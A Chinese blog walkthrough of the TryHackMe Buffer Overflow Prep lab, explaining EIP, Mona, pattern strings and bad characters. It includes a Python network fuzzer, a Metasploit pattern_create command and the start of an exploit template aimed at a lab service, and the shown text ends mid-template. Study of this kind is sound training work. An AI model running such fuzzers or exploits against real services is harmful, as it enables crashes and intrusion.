<!doctype html>
<html lang="zh"><head>
<title>Try Hack Me - Buffer Overflow Prep - Recopec 的博客</title>
<meta charset="UTF-8">
<meta name="keywords" content="">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">

<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
<meta name="description" content="Room：https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;bufferoverflowprep 首先这个房间要有一点点计算机的底层知识，建议开始之前去了解一下。 背景知识EIPEIP 是 x86 架构（32 位）CPU 中的一个特殊寄存器。它非常重要，因为它存储着 CPU 下一条要执行的指令的内存地址。 Immunity Debugger是调试器，类似 OllyDbg x64dbg &amp;#x2">
<meta property="og:type" content="article">
<meta property="og:title" content="Try Hack Me - Buffer Overflow Prep">
<meta property="og:url" content="https://blog.irec.moe/thm_bufferoverflow.html">
<meta property="og:site_name" content="Recopec 的博客">
<meta property="og:description" content="Room：https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;bufferoverflowprep 首先这个房间要有一点点计算机的底层知识，建议开始之前去了解一下。 背景知识EIPEIP 是 x86 架构（32 位）CPU 中的一个特殊寄存器。它非常重要，因为它存储着 CPU 下一条要执行的指令的内存地址。 Immunity Debugger是调试器，类似 OllyDbg x64dbg &amp;#x2">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707160647025.png">
<meta property="og:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707213356165.png">
<meta property="og:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707213628033.png">
<meta property="og:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707215224245.png">
<meta property="og:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707215559310.png">
<meta property="og:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707193600660.png">
<meta property="og:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707194430742.png">
<meta property="og:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707230034068.png">
<meta property="og:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707195035870.png">
<meta property="og:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707225512043.png">
<meta property="article:published_time" content="2025-07-07T16:00:00.000Z">
<meta property="article:modified_time" content="2025-07-07T17:54:35.000Z">
<meta property="article:author" content="Recopec">
<meta property="article:tag" content="栈">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707160647025.png">

<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1758795297158">

<link rel="stylesheet" href="/css/style.css?v=1758795297158">






<script src="/lib/mdui_043tiny/mdui.js" async></script>
<script src="/lib/fancybox/fancybox.umd.js" async></script>
<script src="/lib/lax.min.js" async></script>


<script async src="/js/app.js?v=1758795297158"></script>

 



<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Recopec 的博客" type="application/atom+xml">
</head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/bg.jpg)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="Recopec"><img src="https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg" alt="Recopec"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Recopec">
            <img src="https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg" alt="Recopec" alt="Recopec">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>25</div>
        <div><span>标签</span>34</div>
        <div><span>分类</span>6</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博主
            </div>
        </a>
        
    </div>
    
    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="https://cn.bing.com/search?q=site:irec.moe" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
            </form>
         
    </div>
</div>




    
        
        <div class="nexmoe-widget-wrap">
	<div class="nexmoe-widget nexmoe-social">
		<a
			class="mdui-ripple"
			href="https://space.bilibili.com/8209358"
			target="_blank"
			mdui-tooltip="{content: '哔哩哔哩'}"
			style="
				color: rgb(231, 106, 141);
				background-color: rgba(231, 106, 141, .1);
			"
		>
			<i
				class="nexmoefont icon-bilibili"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://github.com/Recopec/"
			target="_blank"
			mdui-tooltip="{content: 'GitHub'}"
			style="
				color: rgb(25, 23, 23);
				background-color: rgba(25, 23, 23, .1);
			"
		>
			<i
				class="nexmoefont icon-github"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://twitter.com/Recopec"
			target="_blank"
			mdui-tooltip="{content: 'Twitter'}"
			style="
				color: rgb(59, 151, 239);
				background-color: rgba(59, 151, 239, .1);
			"
		>
			<i
				class="nexmoefont icon-twitter"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://t.me/Recopec"
			target="_blank"
			mdui-tooltip="{content: 'TG'}"
			style="
				color: rgb(70, 151, 239);
				background-color: rgba(59, 151, 239, .1);
			"
		>
			<i
				class="nexmoefont icon-telegram"
			></i> </a
		>
	</div>
</div>

    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/THM/">THM</a>
          <span class="category-list-count">6</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/学习/">学习</a>
          <span class="category-list-count">3</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/无线电/">无线电</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/生活/">生活</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/硬件/">硬件</a>
          <span class="category-list-count">8</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/网络/">网络</a>
          <span class="category-list-count">4</span>
        </li>

        
      </ul>

    </div>
  </div>


    
        
        
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/Active-Directory/" style="font-size: 10px;">Active Directory</a> <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/C/" style="font-size: 10px;">C#</a> <a href="/tags/OpenClash/" style="font-size: 10px;">OpenClash</a> <a href="/tags/OpenVPN/" style="font-size: 10px;">OpenVPN</a> <a href="/tags/OpenWrt/" style="font-size: 10px;">OpenWrt</a> <a href="/tags/PC/" style="font-size: 10px;">PC</a> <a href="/tags/VR/" style="font-size: 10px;">VR</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/Windows/" style="font-size: 20px;">Windows</a> <a href="/tags/WireGuard/" style="font-size: 10px;">WireGuard</a> <a href="/tags/WireShark/" style="font-size: 10px;">WireShark</a> <a href="/tags/%E4%BF%9D%E5%81%A5/" style="font-size: 10px;">保健</a> <a href="/tags/%E5%85%89%E7%8C%AB/" style="font-size: 15px;">光猫</a> <a href="/tags/%E5%8D%87%E5%AD%A6/" style="font-size: 10px;">升学</a> <a href="/tags/%E5%8D%AB%E6%98%9F/" style="font-size: 10px;">卫星</a> <a href="/tags/%E6%8A%93%E5%8C%85/" style="font-size: 10px;">抓包</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 15px;">数据库</a> <a href="/tags/%E6%97%A0%E7%BA%BF%E7%94%B5/" style="font-size: 10px;">无线电</a> <a href="/tags/%E6%9C%BA%E5%9C%BA/" style="font-size: 10px;">机场</a> <a href="/tags/%E6%A0%88/" style="font-size: 10px;">栈</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E7%81%B5%E8%BD%A6/" style="font-size: 10px;">灵车</a> <a href="/tags/%E7%94%B5%E6%B1%A0/" style="font-size: 10px;">电池</a> <a href="/tags/%E7%9F%AD%E6%B3%A2/" style="font-size: 10px;">短波</a> <a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 10px;">硬盘</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 15px;">笔记</a> <a href="/tags/%E7%BB%8F%E9%AA%8C/" style="font-size: 10px;">经验</a> <a href="/tags/%E7%BB%AD%E5%91%BD/" style="font-size: 10px;">续命</a> <a href="/tags/%E7%BD%91%E5%8D%A1/" style="font-size: 10px;">网卡</a> <a href="/tags/%E7%BE%8A%E6%AF%9B/" style="font-size: 10px;">羊毛</a> <a href="/tags/%E7%BE%A4%E6%99%96/" style="font-size: 15px;">群晖</a> <a href="/tags/%E8%80%83%E8%AF%95/" style="font-size: 10px;">考试</a> <a href="/tags/%E9%93%B6%E8%A1%8C%E5%8D%A1/" style="font-size: 10px;">银行卡</a>
    </div>
    
      <script>
        var maxTagcloud = parseInt(17);
        var tags_length = parseInt(34);
        var tags_arr = [];
        for(var i = 0; i < tags_length; i++){
          tags_arr.push(i);
        }
        tags_arr.sort(function (l, r) {
          return Math.random() > 0.5 ? -1 : 1;
        });
        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
        }
      </script>
    
  </div>

    
        
        <!-- 一言 -->
<div class="nexmoe-widget-wrap">
  <h3 class="nexmoe-widget-title">
    一言
  </h3>
  <div class="nexmoe-widget">
    <ul class="hitokoto-box">
      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
        <a href="#" id="hitokoto_text">
          
        </a>
        <a href="#" id="hitokoto_error_text" style="display: none;">
          
        </a>
      </li>
    </ul>
  </div>
</div>

<script>
  let hitokotoText = document.getElementById('hitokoto_text')
  let hitokotoErroText = document.getElementById('hitokoto_error_text')
  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
  window.addEventListener('load', function () {
    let url = 'https://v1.hitokoto.cn'
    if (hitokotoCategory) {
      url += '?c=' + hitokotoCategory
    }
    fetch(url)
      .then(response => response.json())
      .then(data => {
        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
      })
      .catch((reason) => {
        console.error(11, reason)
        hitokotoText.style.display = 'none'
        hitokotoErroText.style.display = 'block'
      })
  })
</script>
    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章归档</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">3</span></li></ul>
    </div>
  </div>



    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">最新文章</h3>
    <div class="nexmoe-widget">
      <ul>
        
          <li>
            <a href="/thm_openvpn_conf.html">TryHackMe OpenVPN 配置优化指北</a>
          </li>
        
          <li>
            <a href="/android_capture.html">Android 抓包配置 (Charles + Burp)</a>
          </li>
        
          <li>
            <a href="/thm_rthe.html">Try Hack Me - Red Teaming</a>
          </li>
        
          <li>
            <a href="/thm_ad.html">Try Hack Me - Active Directory</a>
          </li>
        
          <li>
            <a href="/thm_wap.html">Try Hack Me - Web Application Pentesting</a>
          </li>
        
      </ul>
    </div>
  </div>

    
        
   
    <div class="nexmoe-copyright">
        &copy; 2025 Recopec
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
  <article>
    
        <div class="nexmoe-post-cover absolute" style="padding-top: 37.5%;"> 
            <img src="/thm_bufferoverflow/cover.jpg" alt="Try Hack Me - Buffer Overflow Prep" loading="lazy">
            <h1>Try Hack Me - Buffer Overflow Prep</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2025年07月08日</a>
        
            <a class="nexmoefont icon-appstore-fill -link" href="/categories/THM/">THM</a>
        
        
    <a><i class="nexmoefont icon-areachart"></i>约3.1k字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要13分钟</a>

    </div>
    
    
    
    
    
</div>

    <p>Room：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/bufferoverflowprep">https://tryhackme.com/room/bufferoverflowprep</a></p>
<p>首先这个房间要有一点点计算机的底层知识，建议开始之前去了解一下。</p>
<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h3><p>EIP 是 <strong>x86 架构（32 位）CPU 中的一个特殊寄存器</strong>。它非常重要，因为它<strong>存储着 CPU 下一条要执行的指令的内存地址</strong>。</p>
<h3 id="Immunity-Debugger"><a href="#Immunity-Debugger" class="headerlink" title="Immunity Debugger"></a>Immunity Debugger</h3><p>是调试器，类似 OllyDbg x64dbg &#x2F; x32dbg 这种软件，分析调试软件用的。</p>
<h3 id="Mona"><a href="#Mona" class="headerlink" title="Mona"></a>Mona</h3><p><strong>Mona</strong> 是一个功能强大的 <strong>Python 脚本</strong>，专门设计用于扩展和增强 <strong>Immunity Debugger</strong> 或 <strong>WinDbg</strong> 这类调试器的功能。它在**漏洞利用（Exploit Development）<strong>和</strong>逆向工程（Reverse Engineering）<strong>领域非常受欢迎，特别是用于自动化许多在</strong>缓冲区溢出（Buffer Overflow）**漏洞利用过程中繁琐且耗时的任务。</p>
<h3 id="模式字符串（Pattern-String）"><a href="#模式字符串（Pattern-String）" class="headerlink" title="模式字符串（Pattern String）"></a>模式字符串（Pattern String）</h3><p>是在<strong>缓冲区溢出漏洞利用</strong>中用于<strong>精确计算 EIP（指令指针）偏移量</strong>的一种特殊字符串。它由一系列<strong>唯一且按特定算法生成</strong>的字符或字节组成，其独特性在于字符串中的任何一个固定长度的片段都只会在整个字符串的<strong>唯一一个位置</strong>出现。当你将足够长的模式字符串作为输入发送给易受攻击的程序，并导致其崩溃时，被模式字符串片段覆盖的 EIP 寄存器值就如同一个“指纹”或“线索”。通过工具（如 Metasploit 的 <code>pattern_offset.rb</code> 或 Mona 的 <code>findmsp</code> 命令）反向查找这个“指纹”在原始模式字符串中的位置，你就能<strong>精确地确定从输入起始点到 EIP 的字节偏移量</strong>，从而知道需要填充多少垃圾数据才能精准控制程序执行流。</p>
<h3 id="字节序（Endianness）"><a href="#字节序（Endianness）" class="headerlink" title="字节序（Endianness）"></a>字节序（Endianness）</h3><p>字节序指的是<strong>多字节数据（例如一个 32 位整数或一个内存地址）在计算机内存中存储的字节顺序</strong>。主要有两种类型：</p>
<ol>
<li><strong>大端序 (Big-Endian)</strong>：<ul>
<li><strong>最高有效字节 (Most Significant Byte, MSB)</strong> 存储在<strong>最低内存地址</strong>。</li>
<li>就像我们写数字一样：<code>0x12345678</code> 会被存储为 <code>12 34 56 78</code>。</li>
</ul>
</li>
<li><strong>小端序 (Little-Endian)</strong>：<ul>
<li><strong>最低有效字节 (Least Significant Byte, LSB)</strong> 存储在<strong>最低内存地址</strong>。</li>
<li><code>0x12345678</code> 会被存储为 <code>78 56 34 12</code>。</li>
</ul>
</li>
</ol>
<h3 id="坏字符（Bad-Characters）"><a href="#坏字符（Bad-Characters）" class="headerlink" title="坏字符（Bad Characters）"></a>坏字符（Bad Characters）</h3><p>在缓冲区溢出漏洞利用中，你的目标是将一段特定的字节序列（通常是 Shellcode 和返回地址）写入到程序的内存中。然而，程序在处理输入时，可能会使用一些<strong>字符串操作函数</strong>（例如 C 语言中的 <code>strcpy()</code>、<code>strcat()</code>、<code>sprintf()</code> 等）。</p>
<p>这些函数有特定的行为：</p>
<ol>
<li><strong>空字节 (<code>\x00</code>)：</strong> 这是最常见的坏字符。许多字符串函数会将 <code>\x00</code> 解释为字符串的结束符。如果你的 Shellcode 中包含 <code>\x00</code>，那么当这些函数复制你的 Payload 时，它们会在遇到第一个 <code>\x00</code> 时就停止复制，导致 <code>\x00</code> 后面的 Shellcode 部分被截断，无法完整写入内存，从而执行失败。</li>
<li><strong>其他特殊字符：</strong> 除了 <code>\x00</code>，某些应用程序或协议可能还会对其他特定字节值进行特殊处理。例如：<ul>
<li><strong>回车 (<code>\x0d</code>) 和换行 (<code>\x0a</code>)：</strong> 在某些基于行的输入协议中，这些字符可能被视为行的结束符，导致你的 Payload 被截断。</li>
<li><strong>空 ASCII 字符 (<code>\x20</code>，空格)：</strong> 有些协议可能不允许在特定位置出现空格。</li>
<li><strong>其他 ASCII 控制字符或编码问题：</strong> 有些应用程序在处理某些字节值时可能会将其误认为是控制字符，导致数据被修改或丢弃。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="连接机器"><a href="#连接机器" class="headerlink" title="连接机器"></a>连接机器</h2><p>这里我试了好久，网上关于 <code>xfreerdp3</code> 的教程基本上没有。实际上这个软件体验很差，我最后用 socat 映射 3389 给本机，用 mstsc 。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">xfreerdp3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/u:admin</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/p:password</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/cert:ignore</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/sec:rdp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/tls:enforce:1.0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/v:10.10.3.91</span></span></code></pre></div></div></figure>

<p>打开 <code>Immunity Debugger</code> 执行这个命令，设置 mona 的工作文件夹。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">!mona config -set workingfolder c:\mona\%p</span></span></code></pre></div></div></figure>

<p>然后让我们用 nc 连一下服务器，是一个交互程序，好像是让我测试不同的入口会发生什么不一样的错误这样。</p>
<h2 id="找崩溃区间"><a href="#找崩溃区间" class="headerlink" title="找崩溃区间"></a>找崩溃区间</h2><p>生成了一个一直增加发送字符的脚本，步进是 100bytes</p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">#!/usr/bin/env python3</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> socket, time, sys</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">ip </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;10.10.3.91&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">port </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1337</span></span>
<span class="line"><span style="color: #ABB2BF">timeout </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">5</span></span>
<span class="line"><span style="color: #ABB2BF">prefix </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;OVERFLOW1 &quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">string </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> prefix </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;A&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">100</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">True</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">with</span><span style="color: #ABB2BF"> socket.</span><span style="color: #61AFEF">socket</span><span style="color: #ABB2BF">(socket.</span><span style="color: #D19A66">AF_INET</span><span style="color: #ABB2BF">, socket.</span><span style="color: #D19A66">SOCK_STREAM</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">as</span><span style="color: #ABB2BF"> s:</span></span>
<span class="line"><span style="color: #ABB2BF">      s.</span><span style="color: #61AFEF">settimeout</span><span style="color: #ABB2BF">(timeout)</span></span>
<span class="line"><span style="color: #ABB2BF">      s.</span><span style="color: #61AFEF">connect</span><span style="color: #ABB2BF">((ip, port))</span></span>
<span class="line"><span style="color: #ABB2BF">      s.</span><span style="color: #61AFEF">recv</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1024</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">      </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Fuzzing with </span><span style="color: #D19A66">{}</span><span style="color: #98C379"> bytes&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">format</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(string) </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(prefix)))</span></span>
<span class="line"><span style="color: #ABB2BF">      s.</span><span style="color: #61AFEF">send</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">bytes</span><span style="color: #ABB2BF">(string, </span><span style="color: #98C379">&quot;latin-1&quot;</span><span style="color: #ABB2BF">))</span></span>
<span class="line"><span style="color: #ABB2BF">      s.</span><span style="color: #61AFEF">recv</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1024</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">except</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Fuzzing crashed at </span><span style="color: #D19A66">{}</span><span style="color: #98C379"> bytes&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">format</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(string) </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(prefix)))</span></span>
<span class="line"><span style="color: #ABB2BF">    sys.</span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">  string </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">100</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;A&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">  time.</span><span style="color: #61AFEF">sleep</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>

<img src="/thm_bufferoverflow/image-20250707160647025.png" class="" title="image-20250707160647025">

<p>2000bytes 崩溃。</p>
<h2 id="崩溃复现和控制-EIP"><a href="#崩溃复现和控制-EIP" class="headerlink" title="崩溃复现和控制 EIP"></a>崩溃复现和控制 EIP</h2><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 生成一个超过崩溃阈值 400bytes 的文本</span></span>
<span class="line"><span style="color: #61AFEF">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-l</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2400</span></span></code></pre></div></div></figure>

<p>这是让我们找那个崩溃的临界点，加400字节我猜是增加一点容错。替换到代码中的 <code>payload</code> 部分。</p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> socket</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">ip </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;10.10.3.91&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">port </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1337</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">prefix </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;OVERFLOW1 &quot;</span></span>
<span class="line"><span style="color: #ABB2BF">offset </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span>
<span class="line"><span style="color: #ABB2BF">overflow </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;A&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> offset</span></span>
<span class="line"><span style="color: #ABB2BF">retn </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">padding </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span>
